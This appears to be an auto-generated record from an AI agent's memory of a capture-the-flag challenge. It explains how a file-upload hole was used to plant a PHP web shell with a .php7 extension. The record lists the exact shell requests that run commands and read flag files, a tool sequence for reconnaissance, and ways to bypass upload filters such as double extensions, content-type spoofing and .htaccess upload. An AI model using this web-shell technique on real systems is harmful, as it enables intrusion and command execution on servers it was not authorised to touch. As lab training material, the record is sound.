# File Upload Vulnerabilities: When facing a File Upload Vulnerabilities challenge with these tools a

**Type:** experience_success
**Category:** File Upload Vulnerabilities
**Challenge:** Open Application
**Challenge URL:** http://61t71yr0.chals.mctf.io/
**Auto-generated:** 2026-05-03
**Tags:** file_upload, success, experience, do
**Confidence:** medium
**Site fingerprint:** title:404 Not Found|h1:Not Found

**Applies when:** When facing a File Upload Vulnerabilities challenge with these tools available

**Agent takeaway:** Follow this winning tool sequence: robots_txt → path_enumerator → deep_recon → file_upload → http_fetch → backup_file_finder

---

## What Happened

During the exploitation of the file upload challenge, the analyst successfully uploaded a PHP shell through the upload endpoint. The critical step was identifying that the server did not restrict the file extensions sufficiently, allowing execution of PHP code despite the file's unconventional .php7 extension. Following the upload, by utilizing the created shell, the analyst executed commands to retrieve the flag. Further exploration with the HttpFetchTool validated that the uploaded shell was indeed executable and could run commands successfully. Next time, ensuring tighter file type validations, checking server configurations, and implementing a proper content-security policy could prevent such exploits.

## Transferable Rule

Do: Follow this winning tool sequence: robots_txt → path_enumerator → deep_recon → file_upload → http_fetch → backup_file_finder

Reason: Robots.txt absence indicated lack of crawling restrictions, suggesting potential openness to exploration.

## Tools Involved

- `robots_txt`
- `path_enumerator`
- `deep_recon`
- `file_upload`

**Full sequence:** robots_txt → path_enumerator → deep_recon → file_upload → http_fetch → backup_file_finder

## Quick Exploitation Path

> **Note:** Replace `<TARGET_URL>` with the current challenge URL.

1. **`robots_txt`**: Check robots.txt for hidden paths
2. **`path_enumerator`**: Enumerate hidden paths and directories
3. **`deep_recon`**: Use `deep_recon`
4. **`file_upload`**: Use `file_upload`
5. **`http_fetch`**: Fetch the target URL to map the application and identify input forms — use: `{"url": "<TARGET_URL>uploads/shell.php7", "method": "GET", "params": {"cmd": "ls -la"}, "max_body": 4000}`
6. **`backup_file_finder`**: Look for exposed backup or config files

> **Next-step strategy:** Test double extensions (.php.jpg), content-type spoofing, and `.htaccess` upload to enable execution.

## Key Exploit Inputs

The following request(s) produced the flag:

- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "ls -la"}, "max_body": 4000}
- `http_fetch` input: {"url": "http://61t71yr0.chals.mctf.io/uploads/shell.php7", "method": "GET", "params": {"cmd": "cat /flag.txt 2>/dev/null || cat /flag 2>/dev/null || ls -la / && find / -maxdepth 3 -name '*flag*' 2>/dev/null | head"}, "max_body": 4000}

**Seq hash:** 8407529012755734716
